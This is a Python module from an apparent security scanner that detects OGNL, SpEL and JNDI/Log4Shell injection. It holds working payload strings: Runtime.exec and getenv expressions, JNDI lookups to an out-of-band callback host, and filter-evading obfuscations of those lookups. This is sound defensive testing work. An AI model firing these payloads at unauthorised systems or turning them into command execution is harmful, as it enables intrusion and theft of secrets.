"""Expression-language & JNDI injection detection.

Covers three high-impact families:

* **OGNL** (Apache Struts) — ``%{...}`` expressions that can reach ``Runtime``.
* **SpEL** (Spring) — ``#{T(...)...}`` type expressions.
* **JNDI / Log4Shell** — ``${jndi:ldap://...}`` lookups (CVE-2021-44228 class),
  confirmed strictly out-of-band.

JNDI checks require a configured OOB collaborator; the payload only triggers a
lookup to infrastructure the tester controls (no second-stage class is served).
"""

from __future__ import annotations

from ..engine.models import Severity, Target
from .base import Module


class ExpressionLanguage(Module):
    name = "expression_language"
    vuln_class = "Expression Language / JNDI Injection"
    severity = Severity.CRITICAL
    remediation = (
        "Patch affected components (e.g. Log4j >= 2.17.1, current Struts/Spring). "
        "Never evaluate request data as OGNL/SpEL. Disable JNDI lookups in logging "
        "and restrict outbound network egress from application servers."
    )

    def _ognl_spel_payloads(self, marker: str) -> list[str]:
        return [
            # OGNL (Struts) — arithmetic sanity + echo
            "%{" + marker + "}",
            "%{7*7}",
            "%{(#a=@java.lang.Runtime@getRuntime().exec('echo " + marker + "'))}",
            "${{7*7}}",
            # SpEL
            "#{7*7}",
            "#{T(java.lang.Runtime).getRuntime().exec('echo " + marker + "')}",
            "${T(java.lang.System).getenv()}",
        ]

    def _jndi_payloads(self, host: str) -> list[str]:
        schemes = ["ldap", "rmi", "dns", "ldaps"]
        payloads = []
        for scheme in schemes:
            payloads.append("${jndi:" + f"{scheme}://{host}/a" + "}")
        # Common obfuscations used to bypass naive filters — helps assess coverage.
        payloads.append("${${lower:jndi}:${lower:ldap}://" + host + "/a}")
        payloads.append("${${::-j}${::-n}${::-d}${::-i}:ldap://" + host + "/a}")
        return payloads

    async def run(self, target: Target) -> None:
        points = target.injection_points()
        # JNDI is frequently reachable via logged headers; include common ones.
        for point in points:
            await self._check_el(point)
            await self._check_jndi(point)

    async def _check_el(self, point) -> bool:
        marker = self.marker()
        payloads = self._ognl_spel_payloads(marker)
        # Arithmetic sanity (49) as a secondary evaluator signal.
        for payload in payloads:
            result = await self.s.probe(
                point=point, payload=payload, marker=marker,
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                return False
            body = result.response.text
            if marker in body:
                result.verdict.verdict = "executed"
                result.verdict.confidence = 0.9
                result.verdict.signal = "EL expression executed (marker echoed)"
                result.verdict.evidence = marker
                self._record(result, oracle="output")
                return True
            if "49" in body and "7*7" in payload and "7*7" not in body:
                self.log.info(
                    f"[expression_language] evaluator signal (49) at {point.describe()}"
                )
        return False

    async def _check_jndi(self, point) -> bool:
        if not self.s.oob.active:
            return False
        token = self.s.oob.new_token("jndi")
        host = self.s.oob.callback_host(token)
        for payload in self._jndi_payloads(host):
            result = await self.s.probe(
                point=point, payload=payload, marker="",
                vuln_class=self.vuln_class, module=self.name,
            )
            if result is None:
                break
            inter = await self.s.oob.wait_for(token, timeout=8.0)
            if inter is not None:
                result.verdict.verdict = "executed"
                result.verdict.confidence = 0.95
                result.verdict.signal = f"JNDI lookup callback via {inter.protocol}"
                result.verdict.evidence = inter.raw or inter.source_ip
                self._record(result, oracle="oob")
                return True
        return False
